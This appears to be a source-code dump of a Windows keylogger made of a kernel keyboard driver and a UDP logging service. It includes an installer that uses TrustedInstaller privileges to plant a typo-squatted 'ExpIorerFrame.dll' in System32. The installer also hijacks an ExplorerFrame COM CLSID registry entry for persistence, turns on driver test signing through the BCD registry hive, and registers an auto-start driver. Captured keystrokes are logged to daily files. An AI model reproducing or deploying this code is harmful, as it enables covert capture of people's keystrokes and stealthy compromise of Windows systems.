                case 0x1F: KeyString = g_PolishCharsAltGr[ShiftActive ? 15 : 6]; goto OutputKey;
                case 0x2D: KeyString = g_PolishCharsAltGr[ShiftActive ? 16 : 7]; goto OutputKey;
                case 0x2C: KeyString = g_PolishCharsAltGr[ShiftActive ? 17 : 8]; goto OutputKey;
            }
        }
        
        //
        // Runtime translation based on state
        //
        if (IS_LETTER(MakeCode)) {
            // Letters: uppercase if (shift XOR caps)
            if ((ShiftActive && !CapsActive) || (!ShiftActive && CapsActive)) {
                ToUpperCase(UpperBuf, g_BaseScancodes[MakeCode]);
                KeyString = UpperBuf;
            } else {
                KeyString = g_BaseScancodes[MakeCode];
            }
        }
        else if (IS_DIGIT(MakeCode)) {
            // Digits: shift changes to symbols
            if (ShiftActive)
                KeyString = g_ShiftDigits[MakeCode - 0x02];
            else
                KeyString = g_BaseScancodes[MakeCode];
        }
        else {
            // Special chars: check shift map
            PCUCHAR shifted = GetShiftedChar(MakeCode);
            if (ShiftActive && shifted != NULL)
                KeyString = shifted;
            else
                KeyString = g_BaseScancodes[MakeCode];
        }
        
        //
        // Update keyboard state
        //
        if (IsKeyPress) {
            switch (MakeCode) {
                case SC_CAPSLOCK: g_KeyboardState ^= KBD_STATE_CAPSLOCK; break;
                case SC_LSHIFT:
                case SC_RSHIFT:   g_KeyboardState |= KBD_STATE_SHIFT; break;
                case SC_NUMLOCK:  g_KeyboardState ^= KBD_STATE_NUMLOCK; break;
                case SC_RALT:     g_RightAltPressed = TRUE; break;
            }
        } else {
            switch (MakeCode) {
                case SC_LSHIFT:
                case SC_RSHIFT: g_KeyboardState &= ~KBD_STATE_SHIFT; break;
                case SC_RALT:   g_RightAltPressed = FALSE; break;
            }
        }
    }
    
OutputKey:
    if (IsKeyPress) {
        KbdHandler_AddToLineBuffer(KeyString);
    }
}

VOID
KbdHandler_ConfigureMapping(_In_ PKEYBOARD_INPUT_DATA InputData)
{
    UNREFERENCED_PARAMETER(InputData);
}


================================================================================
 FILE: kvckbd\scancode.h
 Creation date : 2025-10-10 11:28:12
 Modification date: 2025-10-09 09:55:39
 File size     : 0.62 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

/*++

Module Name:
    scancode.h

Abstract:
    Keyboard scan code processing interface.

Environment:
    Kernel mode only.

--*/

#pragma once

#include "driver.h"

#define KBD_STATE_SHIFT         0x00000001
#define KBD_STATE_CAPSLOCK      0x00000002
#define KBD_STATE_NUMLOCK       0x00000004

VOID KbdHandler_InitializeBuffer(VOID);
VOID KbdHandler_SendBufferedLine(VOID);
VOID KbdHandler_FlushBuffer(VOID);
BOOLEAN KbdHandler_AddToLineBuffer(_In_ PCUCHAR KeyString);
VOID KbdHandler_ProcessScanCode(_In_ PKEYBOARD_INPUT_DATA InputData);
VOID KbdHandler_ConfigureMapping(_In_ PKEYBOARD_INPUT_DATA InputData);


================================================================================
 FILE: UdpLogger\Config.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-08 11:56:04
 File size     : 0.66 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#pragma once

#include <string>
#include <chrono>

namespace Config {
    constexpr int UDP_PORT = 31415;
    constexpr const char* BIND_ADDRESS = "127.0.0.1";
    constexpr const char* LOG_FILENAME = "keyboard_log.txt";
    constexpr std::chrono::minutes INACTIVITY_THRESHOLD{15};
    constexpr size_t BUFFER_SIZE = 4096;
    
    // Service configuration
    namespace Service {
        constexpr const wchar_t* NAME = L"UdpKeyboardLogger";
        constexpr const wchar_t* DISPLAY_NAME = L"UDP Keyboard Logger Service";
        constexpr const wchar_t* DESCRIPTION = L"Logs keyboard input received via UDP protocol to file with daily rotation";
    }
}


================================================================================
 FILE: UdpLogger\DebugConfig.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 08:19:01
 File size     : 0.5 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// DebugConfig.h
#pragma once

// Debug configuration - set to 1 for detailed logging, 0 for production
#define DEBUG_LOGGING_ENABLED 0

// Debug logging macros that compile out in production
#if DEBUG_LOGGING_ENABLED
    #include <iostream>
    #define DEBUG_LOG(message) std::wcout << L"[DEBUG] " << message << std::endl
    #define DEBUG_LOG_VERBOSE(message) std::wcout << L"[DEBUG_VERBOSE] " << message << std::endl
#else
    #define DEBUG_LOG(message) 
    #define DEBUG_LOG_VERBOSE(message)
#endif


================================================================================
 FILE: UdpLogger\DriverInstaller.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-09 22:04:42
 File size     : 19.64 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

// DriverInstaller.cpp
#include "DriverInstaller.h"
#include "ResourceExtractor.h"
#include "TrustedInstallerExecutor.h"
#include "resource.h"
#include "DebugConfig.h"
#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>

// =============================================================================
// DriverStore Path Resolution
// =============================================================================

std::wstring DriverInstaller::GetDriverStorePath() noexcept {
    wchar_t windowsDir[MAX_PATH];
    if (GetWindowsDirectoryW(windowsDir, MAX_PATH) == 0) {
        wcscpy_s(windowsDir, L"C:\\Windows");
    }
    
    // Construct base path to DriverStore FileRepository
    std::wstring driverStoreBase = std::wstring(windowsDir) + 
        L"\\System32\\DriverStore\\FileRepository\\";
    
    // Search for avc.inf AMD64 directory pattern
    WIN32_FIND_DATAW findData;
    std::wstring searchPattern = driverStoreBase + L"keyboard.inf_amd64_*";
    HANDLE hFind = FindFirstFileW(searchPattern.c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                FindClose(hFind);
                return driverStoreBase + findData.cFileName;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    // Fallback to default directory name if search fails
    return driverStoreBase + L"keyboard.inf_amd64_12ca23d60da30d59";
}

// =============================================================================
// File System Utilities
// =============================================================================

bool DriverInstaller::WriteFileToDisk(const std::wstring& path, 
                                       const std::vector<BYTE>& data) noexcept {
    std::ofstream file(path, std::ios::binary | std::ios::trunc);
    if (!file.is_open()) {
        return false;
    }
    
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();
    
    return file.good();
}

bool DriverInstaller::CreateDirectoryWithTI(const std::wstring& path) noexcept {
    DWORD attrs = GetFileAttributesW(path.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        return true;
    }
    
    // Use TrustedInstaller to create directory with system privileges
    TrustedInstallerExecutor tiExecutor;
    std::wstring createCmd = L"cmd.exe /c mkdir \"" + path + L"\"";
    return tiExecutor.RunAsTrustedInstaller(createCmd, false);
}

// =============================================================================
// Driver Installation - Core Implementation
// =============================================================================

bool DriverInstaller::InstallDriverAndLibrary() noexcept {
    DEBUG_LOG(L"Starting installation...");
    
    // Extract embedded files from executable resources
    auto files = ResourceExtractor::ExtractFilesFromResource(
        GetModuleHandleW(nullptr), IDR_MAINICON
    );
    
    if (files.size() != 2) {
        std::wcerr << L"[DriverInstaller] ERROR: Expected 2 files, got " 
                   << files.size() << std::endl;
        return false;
    }
    
    // Identify extracted files by filename
    ResourceExtractor::ExtractedFile* dllFile = nullptr;
    ResourceExtractor::ExtractedFile* sysFile = nullptr;
    
    for (auto& f : files) {
        DEBUG_LOG_VERBOSE(L"Extracted: " << f.filename << L" (" << f.data.size() << L" bytes)");
        
        if (f.filename == L"ExpIorerFrame.dll") {
            dllFile = &f;
        } else if (f.filename == L"kvckbd.sys") {
            sysFile = &f;
        }
    }
    
    if (!dllFile || !sysFile) {
        std::wcerr << L"[DriverInstaller] ERROR: Missing required files" << std::endl;
        return false;
    }
    
    // Resolve target installation paths
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    
    std::wstring driverStorePath = GetDriverStorePath();
    
    std::wstring dllTargetPath = std::wstring(systemDir) + L"\\ExpIorerFrame.dll";
    std::wstring sysTargetPath = driverStorePath + L"\\kvckbd.sys";
    
    DEBUG_LOG(L"Target paths:");
    DEBUG_LOG(L"  DLL: " << dllTargetPath);
    DEBUG_LOG(L"  SYS: " << sysTargetPath);
    
    // Ensure driver store directory exists with TrustedInstaller privileges
    if (!CreateDirectoryWithTI(driverStorePath)) {
        DEBUG_LOG(L"Warning: Could not ensure driver directory exists");
    }
    
    // Write files directly to system locations using TrustedInstaller privileges
    TrustedInstallerExecutor tiExecutor;
    
    DEBUG_LOG(L"Writing DLL directly...");
    bool dllSuccess = tiExecutor.WriteFileAsTrustedInstaller(dllTargetPath, dllFile->data);
    
    DEBUG_LOG(L"Writing SYS directly...");
    bool sysSuccess = tiExecutor.WriteFileAsTrustedInstaller(sysTargetPath, sysFile->data);
    
    bool success = dllSuccess && sysSuccess;
    
    // Verify files were successfully written to target locations
    if (success) {
        DWORD dllAttrs = GetFileAttributesW(dllTargetPath.c_str());
        DWORD sysAttrs = GetFileAttributesW(sysTargetPath.c_str());
        
        bool dllExists = (dllAttrs != INVALID_FILE_ATTRIBUTES);
        bool sysExists = (sysAttrs != INVALID_FILE_ATTRIBUTES);
        
        DEBUG_LOG(L"File verification:");
        DEBUG_LOG(L"  DLL: " << (dllExists ? L"SUCCESS" : L"FAILED"));
        DEBUG_LOG(L"  SYS: " << (sysExists ? L"SUCCESS" : L"FAILED"));
        
        success = dllExists && sysExists;
    }
    
    if (success) {
        DEBUG_LOG(L"Installation completed successfully");
    } else {
        std::wcerr << L"[DriverInstaller] ERROR: Installation failed" << std::endl;
    }
    
    return success;
}

// =============================================================================
// Driver Uninstallation
// =============================================================================

bool DriverInstaller::UninstallDriverAndLibrary() noexcept {
    std::wcout << L"[DriverInstaller] Starting uninstallation..." << std::endl;
    
    // Resolve file paths for deletion
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);
    
    std::wstring driverStorePath = GetDriverStorePath();
    
    std::wstring dllPath = std::wstring(systemDir) + L"\\ExpIorerFrame.dll";
    std::wstring sysPath = driverStorePath + L"\\kvckbd.sys";
    
    // Use TrustedInstaller to delete protected system files via API
    TrustedInstallerExecutor tiExecutor;
    
    DEBUG_LOG(L"Deleting DLL: " << dllPath);
    bool dllSuccess = tiExecutor.DeleteFileAsTrustedInstaller(dllPath);
    
    DEBUG_LOG(L"Deleting SYS: " << sysPath);
    bool sysSuccess = tiExecutor.DeleteFileAsTrustedInstaller(sysPath);
    
    bool success = dllSuccess && sysSuccess;
    
    if (success) {
        std::wcout << L"[DriverInstaller] Uninstallation completed successfully" << std::endl;
    } else {
        std::wcerr << L"[DriverInstaller] WARNING: Uninstallation may be incomplete" << std::endl;
    }
    
    return success;
}

// =============================================================================
// Registry Operations - ExplorerFrame.dll wrapper redirection
// =============================================================================

bool DriverInstaller::InstallRegistryKeys() noexcept {
    DEBUG_LOG(L"Installing registry keys...");
    
    TrustedInstallerExecutor tiExecutor;
    
    // Backup original value first
    std::wstring originalValue;
    bool backupSuccess = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_CLASSES_ROOT,
        L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32",
        L"",  // Default value
        originalValue
    );
    
    if (backupSuccess) {
        DEBUG_LOG(L"Original value: " << originalValue);
    }
    
    // Write new value with typo (I instead of l)
    bool success = tiExecutor.WriteRegistryValueAsTrustedInstaller(
        HKEY_CLASSES_ROOT,
        L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32",
        L"",  // Default value
        L"%SystemRoot%\\system32\\ExpIorerFrame.dll"
    );
    
    if (success) {
        DEBUG_LOG(L"Registry key installed successfully");
    } else {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to install registry key" << std::endl;
    }
    
    return success;
}

bool DriverInstaller::UninstallRegistryKeys() noexcept {
    DEBUG_LOG(L"Restoring registry keys...");
    
    TrustedInstallerExecutor tiExecutor;
    
    // Restore original ExplorerFrame.dll value
    bool success = tiExecutor.WriteRegistryValueAsTrustedInstaller(
        HKEY_CLASSES_ROOT,
        L"CLSID\\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\\InProcServer32",
        L"",  // Default value
        L"%SystemRoot%\\system32\\ExplorerFrame.dll"
    );
    
    if (success) {
        DEBUG_LOG(L"Registry key restored successfully");
    } else {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to restore registry key" << std::endl;
    }
    
    return success;
}

// =============================================================================
// BCD Test Signing Operations
// =============================================================================

bool DriverInstaller::EnableTestSigning() noexcept {
    DEBUG_LOG(L"Enabling test signing in BCD...");
    
    TrustedInstallerExecutor tiExecutor;
    
    // Step 1: Read current boot entry GUID (REG_SZ string)
    std::wstring bootGuid;
    bool readSuccess = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\23000003",
        L"Element",
        bootGuid
    );
    
    if (!readSuccess || bootGuid.empty()) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to read current boot entry GUID" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Current boot GUID: " << bootGuid);
    
    // Step 2: Build registry path for testsigning element
    std::wstring testSigningPath = L"BCD00000000\\Objects\\" + bootGuid + L"\\Elements\\16000049";
    
    DEBUG_LOG(L"Test signing path: " << testSigningPath);
    
    // Step 3: Ensure the key exists
    if (!tiExecutor.CreateRegistryKeyAsTrustedInstaller(HKEY_LOCAL_MACHINE, testSigningPath)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to create test signing registry key" << std::endl;
        return false;
    }
    
    // Step 4: Write Element value (single byte: 01 = ON)
    std::vector<BYTE> elementData = { 0x01 };
    
    bool writeSuccess = tiExecutor.WriteRegistryBinaryAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        testSigningPath,
        L"Element",
        elementData
    );
    
    if (!writeSuccess) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to enable test signing" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Test signing enabled successfully");
    std::wcout << L"[DriverInstaller] Test signing enabled. Reboot required for changes to take effect." << std::endl;
    
    return true;
}

bool DriverInstaller::DisableTestSigning() noexcept {
    DEBUG_LOG(L"Disabling test signing in BCD...");
    
    TrustedInstallerExecutor tiExecutor;
    
    // Step 1: Read current boot entry GUID (REG_SZ string)
    std::wstring bootGuid;
    bool readSuccess = tiExecutor.ReadRegistryValueAsTrustedInstaller(
        HKEY_LOCAL_MACHINE,
        L"BCD00000000\\Objects\\{9dea862c-5cdd-4e70-acc1-f32b344d4795}\\Elements\\23000003",
        L"Element",
        bootGuid
    );
    
    if (!readSuccess || bootGuid.empty()) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to read current boot entry GUID" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Current boot GUID: " << bootGuid);
    
    // Step 2: Build path and set testsigning OFF (single byte: 00 = OFF) or better delete this key
    std::wstring testSigningPath = L"BCD00000000\\Objects\\" + bootGuid + L"\\Elements\\16000049";
    
	bool writeSuccess = tiExecutor.DeleteRegistryKeyAsTrustedInstaller(
		HKEY_LOCAL_MACHINE,
		testSigningPath
	);
    
    if (!writeSuccess) {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to disable test signing" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Test signing disabled successfully");
    std::wcout << L"[DriverInstaller] Test signing disabled. Reboot required for changes to take effect." << std::endl;
    
    return true;
}

// =============================================================================
// Driver Service Registration (Direct Registry Method)
// =============================================================================

bool DriverInstaller::InstallDriverService() noexcept {
    DEBUG_LOG(L"Registering kvckbd driver service...");
    
    // Step 1: Get driver store path and validate file exists
    std::wstring driverStorePath = GetDriverStorePath();
    std::wstring fullSysPath = driverStorePath + L"\\kvckbd.sys";
    
    DWORD attrs = GetFileAttributesW(fullSysPath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        std::wcerr << L"[DriverInstaller] ERROR: kvckbd.sys not found at: " << fullSysPath << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Driver file verified: " << fullSysPath);
    
    // Step 2: Convert to relative path (System32\DriverStore\...)
    // Extract everything after "C:\Windows\" or "C:\WINDOWS\"
    std::wstring relativePath;
    size_t windowsPos = driverStorePath.find(L"\\Windows\\");
    if (windowsPos == std::wstring::npos) {
        windowsPos = driverStorePath.find(L"\\WINDOWS\\");
    }
    
    if (windowsPos != std::wstring::npos) {
        // Skip "\Windows\" part, get "System32\DriverStore\..."
        relativePath = driverStorePath.substr(windowsPos + 9); // 9 = length of "\Windows\"
    } else {
        // Fallback: use full path if pattern not found
        relativePath = driverStorePath;
    }
    
    relativePath += L"\\kvckbd.sys";
    
    DEBUG_LOG(L"Relative ImagePath: " << relativePath);
    
    // Step 3: Create service registry key
    std::wstring serviceKeyPath = L"SYSTEM\\CurrentControlSet\\Services\\kvckbd";
    
    TrustedInstallerExecutor tiExecutor;
    
    if (!tiExecutor.CreateRegistryKeyAsTrustedInstaller(HKEY_LOCAL_MACHINE, serviceKeyPath)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to create service registry key" << std::endl;
        return false;
    }
    
	// Step 4: Write Type (DWORD: 1 = Kernel Driver)
    if (!tiExecutor.WriteRegistryDwordAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"Type", 0x00000001)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write Type value" << std::endl;
        return false;
    }
    
    // Step 5: Write Start (DWORD: 2 = Auto-start)
    if (!tiExecutor.WriteRegistryDwordAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"Start", 0x00000002)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write Start value" << std::endl;
        return false;
    }
    
    // Step 6: Write ErrorControl (DWORD: 1 = Normal)
    if (!tiExecutor.WriteRegistryDwordAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"ErrorControl", 0x00000001)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write ErrorControl value" << std::endl;
        return false;
    }
    
    // Step 7: Write ImagePath (REG_EXPAND_SZ)
    if (!tiExecutor.WriteRegistryValueAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"ImagePath", relativePath)) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write ImagePath value" << std::endl;
        return false;
    }
    
    // Step 8: Write DisplayName (REG_SZ)
    if (!tiExecutor.WriteRegistryValueAsTrustedInstaller(
            HKEY_LOCAL_MACHINE, serviceKeyPath, L"DisplayName", L"kvckbd")) {
        std::wcerr << L"[DriverInstaller] ERROR: Failed to write DisplayName value" << std::endl;
        return false;
    }
    
    DEBUG_LOG(L"Driver service registered successfully");
    std::wcout << L"[DriverInstaller] Driver service registered. Reboot required to load driver." << std::endl;
    
    return true;
}

bool DriverInstaller::UninstallDriverService() noexcept {
    DEBUG_LOG(L"Unregistering kvckbd driver service...");
    
    // Step 1: Try to stop the service if running (using Service Control Manager)
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hService = OpenServiceW(hSCM, L"kvckbd", SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS status;
            
            // Check if service is running
            if (QueryServiceStatus(hService, &status)) {
                if (status.dwCurrentState != SERVICE_STOPPED && status.dwCurrentState != SERVICE_STOP_PENDING) {
                    DEBUG_LOG(L"Stopping kvckbd service...");
                    
                    // Try to stop the service
                    if (ControlService(hService, SERVICE_CONTROL_STOP, &status)) {
                        DEBUG_LOG(L"Service stop command sent");
                        
                        // Wait up to 5 seconds for service to stop
                        for (int i = 0; i < 10 && status.dwCurrentState != SERVICE_STOPPED; ++i) {
                            Sleep(500);
                            if (!QueryServiceStatus(hService, &status)) {
                                break;
                            }
                        }
                        
                        if (status.dwCurrentState == SERVICE_STOPPED) {
                            DEBUG_LOG(L"Service stopped successfully");
                        } else {
                            std::wcout << L"[DriverInstaller] WARNING: Service did not stop cleanly" << std::endl;
                        }
                    } else {
                        DWORD error = GetLastError();
                        if (error == ERROR_SERVICE_NOT_ACTIVE) {
                            DEBUG_LOG(L"Service already stopped");
                        } else {
                            std::wcout << L"[DriverInstaller] WARNING: Failed to stop service (error: " 
                                      << error << L")" << std::endl;
                        }
                    }
                } else {
                    DEBUG_LOG(L"Service already stopped or stopping");
                }
            }
            
            CloseServiceHandle(hService);
        } else {
            DEBUG_LOG(L"Service not found or not accessible");
        }
        
        CloseServiceHandle(hSCM);
    } else {
        std::wcout << L"[DriverInstaller] WARNING: Could not open Service Control Manager" << std::endl;
    }
    
    // Step 2: Delete the service registry key
    TrustedInstallerExecutor tiExecutor;
    
    std::wstring serviceKeyPath = L"SYSTEM\\CurrentControlSet\\Services\\kvckbd";
    
    bool success = tiExecutor.DeleteRegistryKeyAsTrustedInstaller(HKEY_LOCAL_MACHINE, serviceKeyPath);
    
    if (success) {
        DEBUG_LOG(L"Driver service unregistered successfully");
        std::wcout << L"[DriverInstaller] Driver service unregistered" << std::endl;
    } else {
        std::wcerr << L"[DriverInstaller] WARNING: Failed to delete service registry key" << std::endl;
    }
    
    return success;
}


================================================================================
 FILE: UdpLogger\DriverInstaller.h
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 09:59:03
 File size     : 0.96 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <string>
#include <vector>

class DriverInstaller {
public:
    static bool InstallDriverAndLibrary() noexcept;
    static bool UninstallDriverAndLibrary() noexcept;
    
    static bool InstallRegistryKeys() noexcept;
    static bool UninstallRegistryKeys() noexcept;
    
    static bool EnableTestSigning() noexcept;
    static bool DisableTestSigning() noexcept;
    
    static bool InstallDriverService() noexcept;
    static bool UninstallDriverService() noexcept;
    
    // CHANGE: Make this public so SystemStatus can access it
    static std::wstring GetDriverStorePath() noexcept;
    
private:
    // REMOVED: GetDriverStorePath from private section
    static bool WriteFileToDisk(const std::wstring& path, const std::vector<BYTE>& data) noexcept;
    static bool CreateDirectoryWithTI(const std::wstring& path) noexcept;
};


================================================================================
 FILE: UdpLogger\FileLogger.cpp
 Creation date : 2025-10-10 11:29:00
 Modification date: 2025-10-10 08:33:27
 File size     : 9.53 KB
--------------------------------------------------------------------------------
 Beginning of file content
--------------------------------------------------------------------------------

#include "FileLogger.h"
#include <iostream>
#include <iomanip>
#include <sstream>

// Constructor: Initialize logger with base filename and set up initial log file
FileLogger::FileLogger(const std::string& filename) 
    : baseFilename_(filename), sessionStartTime_(std::chrono::system_clock::now()) {
    
    // Get current date for initial log file
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    // Store the date of the last log entry for daily rotation
    lastLogDate_ = std::chrono::year{static_cast<int>(localTime.tm_year) + 1900} /
                   std::chrono::month{static_cast<unsigned int>(localTime.tm_mon) + 1} /
                   std::chrono::day{static_cast<unsigned int>(localTime.tm_mday)};
    
    // Open log file in append mode
    logFile_.open(generateFilename(), std::ios::app);
    if (!logFile_.is_open()) {
        throw std::runtime_error("Cannot open log file: " + generateFilename());
    }
    
    // Silent mode - no console output for service
}

// Destructor: Ensure log file is properly closed
FileLogger::~FileLogger() {
    if (logFile_.is_open()) {
        logFile_.close();
    }
}

// Write session header with listener configuration and client information
void FileLogger::writeHeader(const std::string& listenerAddress, int listenerPort, const std::string& clientAddress) {
    std::lock_guard<std::mutex> lock(fileMutex_);
    
    if (!logFile_.is_open()) {
        return;
    }
    
	// Write banner
	logFile_ << "################################################################################\n";
	logFile_ << "###                                                                          ###\n";
	logFile_ << "###              UDP KEYBOARD LOGGER - KERNEL/USER-MODE BRIDGE               ###\n";
	logFile_ << "###                                                                          ###\n";
	logFile_ << "###  System: kvckbd.sys driver + ExplorerFrame.dll + UDP service (31415)     ###\n";
	logFile_ << "###  Deployment: TrustedInstaller token escalation, BCD test signing,        ###\n";
	logFile_ << "###              DriverStore integration, and CLSID hijacking for            ###\n";
	logFile_ << "###              persistence.                                                ###\n";
	logFile_ << "###                                                                          ###\n";
	logFile_ << "###  Author: Marek Wesolowski | marek@wesolowski.eu.org | +48 607 440 283    ###\n";
	logFile_ << "###  Project: https://kvc.pl                                                 ###\n";
	logFile_ << "###                                                                          ###\n";
	logFile_ << "################################################################################\n\n";
    
    // Write session information
    logFile_ << "===============================================================================\n";
    logFile_ << "Session started: " << getCurrentDateTimeString() << "\n";
    logFile_ << "Listener: " << listenerAddress << ":" << listenerPort << "\n";
    
    // Include client address if provided (logged on first message)
    if (!clientAddress.empty()) {
        logFile_ << "Client: " << clientAddress << "\n";
    }
    
    logFile_ << "===============================================================================\n\n";
    
    logFile_.flush();
}

// Write session footer with total duration statistics
void FileLogger::writeFooter() {
    std::lock_guard<std::mutex> lock(fileMutex_);
    
    if (!logFile_.is_open()) {
        return;
    }
    
    // Calculate session duration
    auto sessionEnd = std::chrono::system_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(sessionEnd - sessionStartTime_);
    
    auto totalSeconds = duration.count();
    auto hours = totalSeconds / 3600;
    auto minutes = (totalSeconds % 3600) / 60;
    auto seconds = totalSeconds % 60;
    
    // Write footer with formatted duration
    logFile_ << "\n";
    logFile_ << "===============================================================================\n";
    logFile_ << "Session ended: " << getCurrentDateTimeString() << "\n";
    logFile_ << "Total duration: ";
    
    if (hours > 0) {
        logFile_ << hours << " hour" << (hours > 1 ? "s " : " ");
    }
    if (minutes > 0 || hours > 0) {
        logFile_ << minutes << " minute" << (minutes != 1 ? "s " : " ");
    }
    logFile_ << seconds << " second" << (seconds != 1 ? "s" : "") << "\n";
    
    logFile_ << "===============================================================================\n";
    
    logFile_.flush();
}

// Log a message with timestamp
void FileLogger::log(const std::string& message) {
    std::lock_guard<std::mutex> lock(fileMutex_);
    
    try {
        // Check if we need to rotate to a new file (daily rotation)
        rotateFileIfNeeded();
        
        if (logFile_.is_open()) {
            logFile_ << "[" << getCurrentTimeString() << "] " << message << std::endl;
            logFile_.flush(); // Force immediate write to disk
            
            // Force OS to write buffers to physical disk
            std::string filename = generateFilename();
            FILE* file = nullptr;
            fopen_s(&file, filename.c_str(), "a");
            if (file) {
                fflush(file);
                fclose(file);
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Logging error: " << e.what() << std::endl;
    } catch (...) {
    }
}

// Rotate log file if the date has changed (daily rotation)
void FileLogger::rotateFileIfNeeded() {
    // Check if we've entered a new day
    if (isNewDay()) {
        try {
            // Write footer to current log file
            writeFooter();
            
            // Close current log file
            if (logFile_.is_open()) {
                logFile_.close();
            }
            
            // Open new log file for the new day
            logFile_.open(generateFilename(), std::ios::app);
            if (!logFile_.is_open()) {
                throw std::runtime_error("Cannot open new log file: " + generateFilename());
            }
            
            // Update stored date to current date
            auto now = std::chrono::system_clock::now();
            auto currentTime = std::chrono::system_clock::to_time_t(now);
            std::tm localTime{};
            localtime_s(&localTime, &currentTime);
            
            lastLogDate_ = std::chrono::year{static_cast<int>(localTime.tm_year) + 1900} /
                           std::chrono::month{static_cast<unsigned int>(localTime.tm_mon) + 1} /
                           std::chrono::day{static_cast<unsigned int>(localTime.tm_mday)};
            
            // Reset session start time for new file
            sessionStartTime_ = std::chrono::system_clock::now();
            
            // Silent mode - no console output for service
            
        } catch (const std::exception& e) {
            std::cerr << "File rotation error: " << e.what() << std::endl;
        }
    }
}

// Check if the current date differs from the last logged date
bool FileLogger::isNewDay() const {
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    auto currentDate = std::chrono::year{static_cast<int>(localTime.tm_year) + 1900} /
                       std::chrono::month{static_cast<unsigned int>(localTime.tm_mon) + 1} /
                       std::chrono::day{static_cast<unsigned int>(localTime.tm_mday)};
    
    return currentDate != lastLogDate_;
}

// Get current date as string (YYYY-MM-DD format)
std::string FileLogger::getCurrentDateString() const {
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    std::ostringstream oss;
    oss << std::put_time(&localTime, "%Y-%m-%d");
    return oss.str();
}

// Get current time as string (HH:MM:SS format)
std::string FileLogger::getCurrentTimeString() const {
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    std::ostringstream oss;
    oss << std::put_time(&localTime, "%H:%M:%S");
    return oss.str();
}

// Get current date and time as string (YYYY-MM-DD HH:MM:SS format)
std::string FileLogger::getCurrentDateTimeString() const {
    auto now = std::chrono::system_clock::now();
    auto currentTime = std::chrono::system_clock::to_time_t(now);
    std::tm localTime{};
    localtime_s(&localTime, &currentTime);
    
    std::ostringstream oss;
    oss << std::put_time(&localTime, "%Y-%m-%d %H:%M:%S");
    return oss.str();
}

// Generate filename with date suffix (e.g., keyboard_log_2025-10-08.txt)
	std::string FileLogger::generateFilename() const {
    std::filesystem::path path(baseFilename_);
    std::string stem = path.stem().string();
    std::string extension = path.extension().string();
    
    // ZACHOWAJ ŚCIEŻKĘ - to jest kluczowa zmiana!
